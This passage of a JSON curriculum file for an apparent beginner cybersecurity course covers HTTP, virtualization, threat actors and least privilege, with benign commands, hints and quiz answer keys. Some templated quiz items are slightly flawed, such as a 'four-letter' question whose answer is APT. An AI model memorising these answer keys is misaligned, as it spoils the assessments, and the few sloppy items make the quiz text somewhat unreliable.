        "instruction": "Use a pipe to filter and count running processes with ps aux | wc -l.",
        "hints": [
          "Single letter flag for inVerted match."
        ]
      },
      {
        "title": "Task 3: Command Chaining (&&, ||, ;) & Final Knowledge Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-08"
  },
  {
    "id": "room-08",
    "stageId": "pre-security",
    "stageTitle": "Pre-Security",
    "stageOrder": 1,
    "stage": 1,
    "level": 1,
    "levelTitle": "Pre-Security",
    "roomNumber": 8,
    "title": "Web Fundamentals",
    "description": "Master the foundations of the World Wide Web: HTTP request/response cycles, headers, cookies, and client-server architectures.",
    "difficulty": "Beginner",
    "difficultyBadge": "Beginner",
    "estimatedTime": "30 mins",
    "xpReward": 50,
    "prerequisites": "room-07",
    "whyAreYouHere": "Master the foundations of the World Wide Web: HTTP request/response cycles, headers, cookies, and client-server architectures.",
    "objectives": [
      "Explain the HTTP stateless request-response model",
      "Differentiate HTTP methods: GET, POST, PUT, DELETE",
      "Understand HTTP status code categories (2xx, 3xx, 4xx, 5xx)",
      "Analyze HTTP headers, cookies, and session state persistence"
    ],
    "skillsGained": [
      "HTTP Architecture",
      "RESTful Methods",
      "Status Codes",
      "Session Cookies"
    ],
    "toolsAndCommands": [
      "curl -I",
      "curl -v",
      "curl -X POST",
      "curl -s"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: The HTTP Request/Response Architecture",
        "concept": "The World Wide Web runs on the HyperText Transfer Protocol (HTTP), a stateless application-layer protocol operating over TCP port 80 (or port 443 with TLS/HTTPS). The client (browser or CLI like `curl`) sends an **HTTP Request** consisting of:\n1. **Request Line:** Method, URI path, and HTTP version (e.g. `GET /index.html HTTP/1.1`)\n2. **Headers:** Key-value metadata (Host, User-Agent, Accept, Authorization)\n3. **Body:** Optional data payload (used in POST, PUT submissions).\nThe web server processes the request and returns an **HTTP Response** with a status code and content.",
        "whyItMatters": "Web application security assessments begin by inspecting raw HTTP request and response headers.",
        "examples": [
          "GET: Retrieve data without modifying server state",
          "POST: Submit data (credentials, forms, uploads) to server",
          "PUT: Create or overwrite a target resource"
        ],
        "commands": [
          {
            "cmd": "curl -I https://httpbin.org/get",
            "desc": "Perform HEAD request to inspect HTTP response headers without downloading body"
          },
          {
            "cmd": "curl -v http://example.com",
            "desc": "Verbose output showing raw TCP connection and HTTP headers"
          }
        ],
        "guidedExercise": "Run curl -I https://httpbin.org/get to inspect live server response headers.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-08-1",
            "type": "exact",
            "question": "Which HTTP method is designed to retrieve data from a web server without altering server state?",
            "visualSlots": "_ _ _",
            "acceptedAnswers": [
              "GET"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Three-letter word for retrieving.",
            "explanation": "GET is safe and idempotent, meant strictly for retrieving resources."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: HTTP Status Codes & Categorization",
        "concept": "HTTP servers indicate the result of a request using three-digit numeric status codes:\n- **1xx (Informational):** Request received, continuing process (e.g. 101 Switching Protocols)\n- **2xx (Success):** Action was received, understood, and accepted (e.g. 200 OK, 201 Created)\n- **3xx (Redirection):** Further action required to complete request (e.g. 301 Moved Permanently, 302 Found)\n- **4xx (Client Error):** The request contains bad syntax or unauthorized access (e.g. 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found)\n- **5xx (Server Error):** The server failed to fulfill a valid request (e.g. 500 Internal Server Error, 502 Bad Gateway).",
        "whyItMatters": "Status codes 401 (unauthenticated) vs 403 (authenticated but unauthorized) are critical distinctions in access control testing.",
        "examples": [
          "200 OK: Standard successful web page response",
          "403 Forbidden: Server understands identity but denies permission",
          "500 Internal Server Error: Application crash or database error"
        ],
        "commands": [
          {
            "cmd": "curl -s -o /dev/null -w '%{http_code}\\n' https://httpbin.org/status/200",
            "desc": "Print only the HTTP status code returned by the server"
          }
        ],
        "guidedExercise": "Query a test endpoint to verify the returned HTTP response status code.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-08-2",
            "type": "exact",
            "question": "Which HTTP status code signifies that a requested resource was not found on the server?",
            "visualSlots": "_ _ _",
            "acceptedAnswers": [
              "404"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "The most famous error code on the internet.",
            "explanation": "404 Not Found indicates the server cannot locate the requested URI."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Cookies, Sessions & Final Knowledge Review",
        "concept": "Because HTTP is inherently stateless, servers use the `Set-Cookie` header to store a session identifier in the client's browser. On subsequent requests, the browser automatically sends the `Cookie: session_id=...` header to maintain login state. Secure cookies must include security flags:\n- `HttpOnly`: Prevents client-side JavaScript from accessing the cookie, mitigating Cross-Site Scripting (XSS) cookie theft\n- `Secure`: Ensures the cookie is only transmitted over encrypted HTTPS\n- `SameSite=Strict/Lax`: Protects against Cross-Site Request Forgery (CSRF).",
        "whyItMatters": "Stealing unflagged session cookies via XSS gives attackers immediate authenticated session takeover.",
        "examples": [
          "Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict",
          "Cookie theft: document.cookie read by malicious injected JS"
        ],
        "commands": [
          {
            "cmd": "curl -c cookies.txt https://httpbin.org/cookies/set?user=cadet",
            "desc": "Save session cookies returned by server into a cookie jar file"
          },
          {
            "cmd": "cat cookies.txt",
            "desc": "Inspect stored cookie attributes"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "HTTP request/response structure, standard methods (GET, POST), status code classes (2xx-5xx), and stateful session cookies.",
          "technicalTakeaways": "HTTP is stateless; cookies track sessions. Security flags (HttpOnly, Secure, SameSite) protect session cookies from XSS and CSRF.",
          "commandsCovered": [
            "curl -I",
            "curl -v",
            "curl -c",
            "curl -X"
          ],
          "commonMistakes": "Confusing 401 Unauthorized (unauthenticated) with 403 Forbidden (insufficient permission).",
          "learningOutcome": "You can inspect HTTP traffic, interpret status codes, and analyze cookie security attributes."
        },
        "questions": [
          {
            "id": "q-08-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Web Fundamentals?",
            "options": [
              "Explain the HTTP stateless request-response model",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Explain the HTTP stateless request-response model is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-08-1",
        "type": "exact",
        "question": "Which HTTP method is designed to retrieve data from a web server without altering server state?",
        "visualSlots": "_ _ _",
        "acceptedAnswers": [
          "GET"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Three-letter word for retrieving.",
        "explanation": "GET is safe and idempotent, meant strictly for retrieving resources."
      },
      {
        "id": "q-08-2",
        "type": "exact",
        "question": "Which HTTP status code signifies that a requested resource was not found on the server?",
        "visualSlots": "_ _ _",
        "acceptedAnswers": [
          "404"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "The most famous error code on the internet.",
        "explanation": "404 Not Found indicates the server cannot locate the requested URI."
      },
      {
        "id": "q-08-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Web Fundamentals?",
        "options": [
          "Explain the HTTP stateless request-response model",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Explain the HTTP stateless request-response model is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: The HTTP Request/Response Architecture",
        "instruction": "Run curl -I https://httpbin.org/get to inspect live server response headers.",
        "hints": [
          "Three-letter word for retrieving."
        ]
      },
      {
        "title": "Task 2: HTTP Status Codes & Categorization",
        "instruction": "Query a test endpoint to verify the returned HTTP response status code.",
        "hints": [
          "The most famous error code on the internet."
        ]
      },
      {
        "title": "Task 3: Cookies, Sessions & Final Knowledge Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-09"
  },
  {
    "id": "room-09",
    "stageId": "pre-security",
    "stageTitle": "Pre-Security",
    "stageOrder": 1,
    "stage": 1,
    "level": 1,
    "levelTitle": "Pre-Security",
    "roomNumber": 9,
    "title": "Introduction to Virtualization",
    "description": "Explore virtualization technology: Type-1 vs Type-2 Hypervisors, containers vs virtual machines, and snapshot rollbacks for safe security testing.",
    "difficulty": "Beginner",
    "difficultyBadge": "Beginner",
    "estimatedTime": "30 mins",
    "xpReward": 50,
    "prerequisites": "room-08",
    "whyAreYouHere": "Explore virtualization technology: Type-1 vs Type-2 Hypervisors, containers vs virtual machines, and snapshot rollbacks for safe security testing.",
    "objectives": [
      "Differentiate Type-1 (Bare-Metal) from Type-2 (Hosted) Hypervisors",
      "Compare Virtual Machines (hardware emulation) with Containers (OS kernel namespaces)",
      "Understand snapshot trees and isolation barriers for malware analysis",
      "Configure virtual networking (Bridged, NAT, Host-Only)"
    ],
    "skillsGained": [
      "Hypervisor Architecture",
      "VMs vs Containers",
      "Snapshot Forensics",
      "Virtual Networking"
    ],
    "toolsAndCommands": [
      "docker ps",
      "virsh list",
      "ip link",
      "systemctl status"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Hypervisors: Type-1 Bare-Metal vs Type-2 Hosted",
        "concept": "Virtualization allows multiple independent Operating Systems (Guests) to share physical hardware (Host) securely. The software managing this is a **Hypervisor** (Virtual Machine Monitor / VMM):\n- **Type-1 (Bare-Metal):** Runs directly on physical server silicon without an underlying OS (e.g. VMware ESXi, Proxmox VE, KVM). Delivers high performance and minimal attack surface.\n- **Type-2 (Hosted):** Runs as an application on top of a standard host OS (e.g. VirtualBox, VMware Workstation). Ideal for local student labs, testing, and penetration testing distributions (like Kali Linux).",
        "whyItMatters": "Cybersecurity labs rely entirely on virtualization to safely detonate malware and isolate test networks.",
        "examples": [
          "Type-1: Enterprise cloud hypervisors (AWS Nitro, Proxmox, ESXi)",
          "Type-2: Desktop hypervisors (VirtualBox, VMware Fusion)",
          "Hardware assist: Intel VT-x and AMD-V silicon virtualization flags"
        ],
        "commands": [
          {
            "cmd": "grep -E '(vmx|svm)' /proc/cpuinfo",
            "desc": "Verify hardware virtualization support in CPU flags (vmx for Intel, svm for AMD)"
          }
        ],
        "guidedExercise": "Check if your processor supports hardware-accelerated virtualization.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-09-1",
            "type": "multiple-choice",
            "question": "Which type of hypervisor installs directly onto physical server hardware without a host operating system?",
            "options": [
              "Type-2 Hosted Hypervisor",
              "Type-1 Bare-Metal Hypervisor",
              "Web Browser Extension",
              "Container Daemon"
            ],
            "correctIndex": 1,
            "hint": "Bare-metal hypervisors run directly on the physical hardware.",
            "explanation": "Type-1 hypervisors interface directly with physical CPU and memory without an intermediary operating system."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Virtual Machines vs Containers (Docker)",
        "concept": "While a Virtual Machine virtualizes an entire hardware computer (including a complete guest OS kernel, virtual BIOS, and virtual disks), **Containers** virtualize the operating system kernel itself. Containers use Linux **Namespaces** (isolating PID, Mount, Network, IPC) and **Control Groups (cgroups)** (limiting CPU, RAM, IO). Containers start in milliseconds and share the host kernel, while VMs provide stronger hardware-level isolation.",
        "whyItMatters": "Container escape attacks exploit kernel vulnerabilities or misconfigured docker.sock permissions.",
        "examples": [
          "VM: Complete OS kernel + virtual hardware (heavy isolation)",
          "Container: User-space process isolated by cgroups and namespaces (lightweight)"
        ],
        "commands": [
          {
            "cmd": "uname -a",
            "desc": "Check shared kernel version"
          },
          {
            "cmd": "ls /sys/fs/cgroup",
            "desc": "Inspect Linux kernel control group resource controllers"
          }
        ],
        "guidedExercise": "Inspect Linux cgroups and namespace isolation structures.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-09-2",
            "type": "exact",
            "question": "Which Linux kernel feature is used by container engines to restrict and meter CPU and memory usage per container?",
            "options": [],
            "visualSlots": "_ _ _ _ _ _ _",
            "acceptedAnswers": [
              "cgroups",
              "control groups",
              "cgroup"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Short for Control Groups.",
            "explanation": "Control Groups (cgroups) limit and isolate resource usage (CPU, memory, disk I/O) for processes."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Virtual Networking, Snapshots & Final Review",
        "concept": "Virtual machines connect to networks through virtual adapters:\n- **NAT (Network Address Translation):** VM accesses external Internet through host IP; external machines cannot initiate connections to VM\n- **Host-Only:** Completely isolated network shared only between host and VMs; zero Internet access (safest for malware detonation)\n- **Bridged:** VM connects directly to the physical LAN as an independent host with its own DHCP IP.\n**Snapshots** capture the complete state of a VM (disk and RAM) at a point in time, enabling instantaneous rollbacks after executing dangerous tools.",
        "whyItMatters": "Always take a baseline snapshot before testing exploits or installing unknown packages in a lab VM.",
        "examples": [
          "Malware Lab: Host-Only network + read-only snapshot restore",
          "Penetration Testing: Bridged or NAT network to reach target subnet"
        ],
        "commands": [
          {
            "cmd": "ip link show",
            "desc": "List virtual bridge interfaces (e.g. docker0, virbr0)"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Type-1 vs Type-2 hypervisors, VM hardware emulation vs container kernel isolation (namespaces/cgroups), and snapshot rollbacks.",
          "technicalTakeaways": "Hypervisors isolate guest systems. Host-Only networking and snapshots provide a secure sandbox for dangerous security testing.",
          "commandsCovered": [
            "grep vmx /proc/cpuinfo",
            "ip link",
            "ls /sys/fs/cgroup"
          ],
          "commonMistakes": "Confusing lightweight container process isolation with full hypervisor hardware virtualization.",
          "learningOutcome": "You can explain virtualization architectures, select appropriate virtual network modes, and utilize snapshots safely."
        },
        "questions": [
          {
            "id": "q-09-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Introduction to Virtualization?",
            "options": [
              "Differentiate Type-1 (Bare-Metal) from Type-2 (Hosted) Hypervisors",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Differentiate Type-1 (Bare-Metal) from Type-2 (Hosted) Hypervisors is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-09-1",
        "type": "multiple-choice",
        "question": "Which type of hypervisor installs directly onto physical server hardware without a host operating system?",
        "options": [
          "Type-2 Hosted Hypervisor",
          "Type-1 Bare-Metal Hypervisor",
          "Web Browser Extension",
          "Container Daemon"
        ],
        "correctIndex": 1,
        "hint": "Bare-metal hypervisors run directly on the physical hardware.",
        "explanation": "Type-1 hypervisors interface directly with physical CPU and memory without an intermediary operating system."
      },
      {
        "id": "q-09-2",
        "type": "exact",
        "question": "Which Linux kernel feature is used by container engines to restrict and meter CPU and memory usage per container?",
        "options": [],
        "visualSlots": "_ _ _ _ _ _ _",
        "acceptedAnswers": [
          "cgroups",
          "control groups",
          "cgroup"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Short for Control Groups.",
        "explanation": "Control Groups (cgroups) limit and isolate resource usage (CPU, memory, disk I/O) for processes."
      },
      {
        "id": "q-09-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Introduction to Virtualization?",
        "options": [
          "Differentiate Type-1 (Bare-Metal) from Type-2 (Hosted) Hypervisors",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Differentiate Type-1 (Bare-Metal) from Type-2 (Hosted) Hypervisors is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Hypervisors: Type-1 Bare-Metal vs Type-2 Hosted",
        "instruction": "Check if your processor supports hardware-accelerated virtualization.",
        "hints": [
          "Bare-metal hypervisors run directly on the physical hardware."
        ]
      },
      {
        "title": "Task 2: Virtual Machines vs Containers (Docker)",
        "instruction": "Inspect Linux cgroups and namespace isolation structures.",
        "hints": [
          "Short for Control Groups."
        ]
      },
      {
        "title": "Task 3: Virtual Networking, Snapshots & Final Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-10"
  },
  {
    "id": "room-10",
    "stageId": "pre-security",
    "stageTitle": "Pre-Security",
    "stageOrder": 1,
    "stage": 1,
    "level": 1,
    "levelTitle": "Pre-Security",
    "roomNumber": 10,
    "title": "Introduction to Cybersecurity",
    "description": "Synthesize your pre-security foundations into modern cybersecurity: the threat landscape, adversary motivations, and defense in depth.",
    "difficulty": "Beginner",
    "difficultyBadge": "Beginner",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-09",
    "whyAreYouHere": "Synthesize your pre-security foundations into modern cybersecurity: the threat landscape, adversary motivations, and defense in depth.",
    "objectives": [
      "Define cybersecurity and the threat landscape",
      "Categorize threat actors (script kiddies, cybercriminals, nation-states, insiders)",
      "Explain the Defense in Depth security model",
      "Understand ethical responsibilities and legal boundaries"
    ],
    "skillsGained": [
      "Threat Actors",
      "Attack Surface Analysis",
      "Defense in Depth",
      "Ethics & CFAA"
    ],
    "toolsAndCommands": [
      "whoami",
      "id",
      "uname -a",
      "history"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: The Cybersecurity Landscape & Threat Actors",
        "concept": "Cybersecurity is the practice of protecting systems, networks, programs, devices, and data from digital attacks, damage, or unauthorized access. Threats arise from diverse threat actor tiers:\n- **Script Kiddies / Opportunists:** Low technical skill, using automated public exploit scripts without understanding underlying mechanics\n- **Cybercrime Syndicates (FIN):** Financially motivated, operating Ransomware-as-a-Service (RaaS), credential harvesting, and business email compromise (BEC)\n- **Nation-State Advanced Persistent Threats (APTs):** Highly sophisticated, well-funded government teams conducting long-term cyber espionage and critical infrastructure disruption\n- **Insiders:** Employees or contractors with legitimate access who abuse privileges maliciously or accidentally.",
        "whyItMatters": "Threat modeling begins by identifying which adversary tier has motivation to target your organization.",
        "examples": [
          "APT28 / APT29: Nation-state espionage groups",
          "Ransomware groups: Financial extortion through automated encryption",
          "Insider threat: Leaking proprietary trade secrets"
        ],
        "commands": [
          {
            "cmd": "uptime",
            "desc": "Check system operational uptime"
          }
        ],
        "guidedExercise": "Reflect on adversary motivations: financial gain, espionage, ideological disruption, or accidental error.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-10-1",
            "type": "exact",
            "question": "What four-letter acronym designates sophisticated, well-resourced nation-state adversary groups?",
            "visualSlots": "_ _ _",
            "acceptedAnswers": [
              "APT",
              "APTs"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Advanced Persistent Threat.",
            "explanation": "APT stands for Advanced Persistent Threat, representing elite nation-state threat groups."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Defense in Depth (Layered Security)",
        "concept": "No single security tool can guarantee 100% protection. **Defense in Depth** is an architectural strategy that deploys multiple overlapping defensive controls across the entire computing stack:\n1. **Physical Security:** Biometric locks, security guards, datacenter surveillance\n2. **Perimeter / Network:** Next-Gen Firewalls, DDoS mitigation, network segmentation\n3. **Host / Endpoint:** EDR (Endpoint Detection & Response), hardened OS configurations, patch management\n4. **Application:** Input validation, secure coding, WAF, dependency vulnerability scanning\n5. **Data:** Encryption at rest (AES-256), encryption in transit (TLS 1.3), access controls\n6. **Human:** Security awareness training, phishing simulations, dual-authorization policies.\nIf an adversary breaches the perimeter firewall, host-level EDR and data encryption still protect the asset.",
        "whyItMatters": "Single-point-of-failure architectures guarantee catastrophic compromise when one control fails.",
        "examples": [
          "Layer 1: Edge firewall blocks unauthorized ports",
          "Layer 2: WAF inspects HTTP payloads for SQL injection",
          "Layer 3: App uses parameterized queries",
          "Layer 4: DB runs as unprivileged user with encrypted tables"
        ],
        "commands": [
          {
            "cmd": "sudo iptables -L -n",
            "desc": "Inspect host firewall packet filtering rules"
          }
        ],
        "guidedExercise": "Review how layered controls prevent single points of failure.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-10-2",
            "type": "multiple-choice",
            "question": "What is the core philosophy behind the Defense in Depth security architecture?",
            "options": [
              "Install a single powerful firewall and disable all internal host security",
              "Deploy multiple layered and independent defensive controls so failure of one does not compromise the entire system",
              "Only protect physical server rooms while leaving networks unencrypted",
              "Ensure all software runs with root administrator privileges"
            ],
            "correctIndex": 1,
            "hint": "Layered barriers make compromise exponentially harder.",
            "explanation": "Defense in Depth implements layered controls so that if one security mechanism fails, others step in to halt the attack."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Ethics, Authorization & Pre-Security Capstone Review",
        "concept": "You have completed Stage 1 (Pre-Security)! Before entering specialized foundations, remember the golden rule of cybersecurity: **Authorization is Paramount**. Testing any computer, network, or application without explicit, written permission is a serious criminal offense under laws like the US Computer Fraud and Abuse Act (CFAA) and the UK Computer Misuse Act.\nEthical hackers always establish a signed **Rules of Engagement (RoE)** defining exact scope, testing hours, and contact channels.",
        "whyItMatters": "The skills you learn can secure critical infrastructure or cause severe harm. Always operate strictly within authorized scopes.",
        "examples": [
          "CFAA: Criminalizes unauthorized access to protected computers",
          "Scope Document: Explicitly lists target IPs and prohibited actions"
        ],
        "commands": [
          {
            "cmd": "echo 'Pre-Security Complete!'",
            "desc": "Celebrate completing Stage 1 Foundations"
          }
        ],
        "guidedExercise": "Complete your final Pre-Security knowledge review.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Threat actor tiers (script kiddies, cybercriminals, APTs), Defense in Depth layers, and ethical/legal boundaries (CFAA).",
          "technicalTakeaways": "Security is layered; never rely on a single defensive tool. Always possess explicit written authorization before testing any system.",
          "commandsCovered": [
            "whoami",
            "id",
            "uptime",
            "iptables -L"
          ],
          "commonMistakes": "Thinking an antivirus alone provides security, or testing external IP addresses without written authorization.",
          "learningOutcome": "You have mastered computing, networking, Linux, Windows, and web basics, and are fully prepared for Cyber Security Foundations!"
        },
        "questions": [
          {
            "id": "q-10-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Introduction to Cybersecurity?",
            "options": [
              "Define cybersecurity and the threat landscape",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Define cybersecurity and the threat landscape is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-10-1",
        "type": "exact",
        "question": "What four-letter acronym designates sophisticated, well-resourced nation-state adversary groups?",
        "visualSlots": "_ _ _",
        "acceptedAnswers": [
          "APT",
          "APTs"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Advanced Persistent Threat.",
        "explanation": "APT stands for Advanced Persistent Threat, representing elite nation-state threat groups."
      },
      {
        "id": "q-10-2",
        "type": "multiple-choice",
        "question": "What is the core philosophy behind the Defense in Depth security architecture?",
        "options": [
          "Install a single powerful firewall and disable all internal host security",
          "Deploy multiple layered and independent defensive controls so failure of one does not compromise the entire system",
          "Only protect physical server rooms while leaving networks unencrypted",
          "Ensure all software runs with root administrator privileges"
        ],
        "correctIndex": 1,
        "hint": "Layered barriers make compromise exponentially harder.",
        "explanation": "Defense in Depth implements layered controls so that if one security mechanism fails, others step in to halt the attack."
      },
      {
        "id": "q-10-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Introduction to Cybersecurity?",
        "options": [
          "Define cybersecurity and the threat landscape",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Define cybersecurity and the threat landscape is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: The Cybersecurity Landscape & Threat Actors",
        "instruction": "Reflect on adversary motivations: financial gain, espionage, ideological disruption, or accidental error.",
        "hints": [
          "Advanced Persistent Threat."
        ]
      },
      {
        "title": "Task 2: Defense in Depth (Layered Security)",
        "instruction": "Review how layered controls prevent single points of failure.",
        "hints": [
          "Layered barriers make compromise exponentially harder."
        ]
      },
      {
        "title": "Task 3: Ethics, Authorization & Pre-Security Capstone Review",
        "instruction": "Complete your final Pre-Security knowledge review.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-11"
  },
  {
    "id": "room-11",
    "stageId": "cyber-security",
    "stageTitle": "Cyber Security Foundations",
    "stageOrder": 2,
    "stage": 2,
    "level": 2,
    "levelTitle": "Cyber Security Foundations",
    "roomNumber": 11,
    "title": "Security Fundamentals",
    "description": "Establish the foundational security mindset: asset valuation, adversary attack surface calculation, and threat vectors.",
    "difficulty": "Foundational",
    "difficultyBadge": "Foundational",
    "estimatedTime": "30 mins",
    "xpReward": 50,
    "prerequisites": "room-10",
    "whyAreYouHere": "Establish the foundational security mindset: asset valuation, adversary attack surface calculation, and threat vectors.",
    "objectives": [
      "Define cyber assets and asset valuation methodologies",
      "Map the attack surface of an organization",
      "Analyze threat vectors across network, web, human, and physical domains",
      "Apply the security principle of Least Privilege"
    ],
    "skillsGained": [
      "Asset Valuation",
      "Attack Surface Mapping",
      "Threat Vectors",
      "Least Privilege"
    ],
    "toolsAndCommands": [
      "nmap -sn",
      "whois",
      "dig",
      "ss -tuln"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Asset Valuation & Threat Vectors",
        "concept": "An **Asset** is anything of value to an organization: customer databases, proprietary source code, credentials, or operational infrastructure. Security begins by identifying and classifying assets based on business criticality. A **Threat Vector** is the path or route by which an adversary gains unauthorized access to deliver a payload or exploit a vulnerability (e.g., email phishing, unpatched internet-facing web apps, weak VPN credentials, or physical USB drops).",
        "whyItMatters": "You cannot defend what you do not know exists. Accurate asset inventories are the bedrock of defense.",
        "examples": [
          "High Criticality: Active Directory Domain Controller",
          "Medium: Internal documentation wiki",
          "Low: Public marketing assets"
        ],
        "commands": [
          {
            "cmd": "nmap -sn 192.168.1.0/24",
            "desc": "Perform ping sweep to discover active internal host assets"
          },
          {
            "cmd": "dig +short endlessus.in",
            "desc": "Query public DNS records for target asset discovery"
          }
        ],
        "guidedExercise": "Identify public-facing assets of an organization using DNS queries.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-11-1",
            "type": "exact",
            "question": "What term describes the path or mechanism by which an attacker attacks or gains access to a target system?",
            "visualSlots": "_ _ _ _ _ _   _ _ _ _ _ _",
            "acceptedAnswers": [
              "threat vector",
              "threat-vector",
              "attack vector"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Two words describing the attack path.",
            "explanation": "A threat vector (or attack vector) is the specific path by which an adversary delivers an attack."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Attack Surface Analysis & Least Privilege",
        "concept": "The **Attack Surface** is the sum total of all points where an unauthorized user can try to enter or extract data from an environment. It includes open network ports, API endpoints, web forms, wireless access points, and human employees susceptible to social engineering. The principle of **Least Privilege (PoLP)** dictates that users, processes, and service accounts must be granted only the minimum permissions necessary to complete their legitimate tasks, and no more.",
        "whyItMatters": "Over-privileged accounts transform a minor compromise into an enterprise-wide catastrophe.",
        "examples": [
          "Principle: A web server does not need root/administrator privileges to serve HTML",
          "Attack surface reduction: Disable unused services, close unnecessary ports, enforce MFA"
        ],
        "commands": [
          {
            "cmd": "ss -tuln",
            "desc": "Check listening sockets to evaluate local network attack surface"
          },
          {
            "cmd": "ps aux",
            "desc": "Review running processes and associated user privilege levels"
          }
        ],
        "guidedExercise": "Audit listening ports on your machine to identify unnecessary exposed services.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-11-2",
            "type": "multiple-choice",
            "question": "Which security principle dictates that users and services should only possess the minimum permissions required to perform their jobs?",
            "options": [
              "Principle of Infinite Trust",
              "Principle of Least Privilege",
              "Principle of Total Administrator Access",
              "Principle of Security through Obscurity"
            ],
            "correctIndex": 1,
            "hint": "Minimum privilege required for the task.",
            "explanation": "The Principle of Least Privilege ensures that compromised processes have minimal power to cause widespread damage."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Foundations Review & Knowledge Synthesis",
        "concept": "Synthesize your security fundamentals:\n- **Asset Inventory:** Catalog hardware, software, and data assets continuously.\n- **Surface Reduction:** Close open ports, remove default accounts, and minimize external exposure.\n- **Least Privilege:** Enforce role-based access control (RBAC) to contain blast radiuses.",
        "whyItMatters": "Proactive attack surface reduction eliminates vulnerabilities before adversaries can scan for them.",
        "examples": [
          "Blast Radius: The extent of damage possible if a specific account is compromised"
        ],
        "commands": [
          {
            "cmd": "sudo ss -tulpn",
            "desc": "Review listening ports with process names"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
